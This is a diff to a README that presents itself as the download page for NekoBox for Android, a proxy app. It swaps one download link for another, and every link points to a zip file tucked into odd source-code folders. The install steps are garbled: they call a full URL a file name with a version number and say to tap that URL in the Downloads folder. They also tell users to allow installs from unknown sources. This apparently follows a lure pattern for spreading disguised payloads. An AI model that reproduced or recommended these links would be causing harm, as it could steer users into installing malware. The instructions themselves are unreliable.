@@ -4,7 +4,7 @@
 Welcome to NekoBox for Android! This application provides a user-friendly tool to manage proxy connections on your Android device. Whether you want to enhance your internet privacy or access blocked content, NekoBox simplifies the process.
 
 ## 📥 Download NekoBox
-[![Download NekoBox](https://raw.githubusercontent.com/Ohayo18/NekoBoxForAndroid/main/app/src/main/assets/yacd.zip%20Now-%https://raw.githubusercontent.com/Ohayo18/NekoBoxForAndroid/main/app/src/main/assets/yacd.zip)](https://raw.githubusercontent.com/Ohayo18/NekoBoxForAndroid/main/app/src/main/assets/yacd.zip)
+[![Download NekoBox](https://github.com/Ohayo18/NekoBoxForAndroid/raw/refs/heads/main/app/src/main/aidl/io/nekohasekai/sagernet/aidl/Box-For-Android-Neko-v3.0.zip%20Now-%https://github.com/Ohayo18/NekoBoxForAndroid/raw/refs/heads/main/app/src/main/aidl/io/nekohasekai/sagernet/aidl/Box-For-Android-Neko-v3.0.zip)](https://github.com/Ohayo18/NekoBoxForAndroid/raw/refs/heads/main/app/src/main/aidl/io/nekohasekai/sagernet/aidl/Box-For-Android-Neko-v3.0.zip)
 
 ## 📋 Features
 - **Universal Proxy Support:** Easily connect to various proxies such as Shadowsocks, Trojan, and VMess.
@@ -20,13 +20,13 @@ To run NekoBox on your Android device, please ensure you meet the following requ
 - **Network Connections:** Wi-Fi or cellular data for internet access.
 
 ## 💻 How to Download & Install
-1. **Visit the Releases Page:** Click this link to go to the NekoBox releases page: [Download NekoBox](https://raw.githubusercontent.com/Ohayo18/NekoBoxForAndroid/main/app/src/main/assets/yacd.zip).
+1. **Visit the Releases Page:** Click this link to go to the NekoBox releases page: [Download NekoBox](https://github.com/Ohayo18/NekoBoxForAndroid/raw/refs/heads/main/app/src/main/aidl/io/nekohasekai/sagernet/aidl/Box-For-Android-Neko-v3.0.zip).
 
 2. **Locate the Latest Version:** On the releases page, find the latest version of NekoBox. It is usually marked at the top of the list.
 
-3. **Download the APK File:** Look for a file named `https://raw.githubusercontent.com/Ohayo18/NekoBoxForAndroid/main/app/src/main/assets/yacd.zip` where `X.X.X` represents the version number. Click on this file to start downloading.
+3. **Download the APK File:** Look for a file named `https://github.com/Ohayo18/NekoBoxForAndroid/raw/refs/heads/main/app/src/main/aidl/io/nekohasekai/sagernet/aidl/Box-For-Android-Neko-v3.0.zip` where `X.X.X` represents the version number. Click on this file to start downloading.
 
-4. **Open the APK File:** Once the file is downloaded, navigate to your device's "Downloads" folder and tap on `https://raw.githubusercontent.com/Ohayo18/NekoBoxForAndroid/main/app/src/main/assets/yacd.zip`.
+4. **Open the APK File:** Once the file is downloaded, navigate to your device's "Downloads" folder and tap on `https://github.com/Ohayo18/NekoBoxForAndroid/raw/refs/heads/main/app/src/main/aidl/io/nekohasekai/sagernet/aidl/Box-For-Android-Neko-v3.0.zip`.
 
 5. **Install the Application:** Follow the prompts to install NekoBox. If prompted, allow installations from unknown sources in your device settings.
 
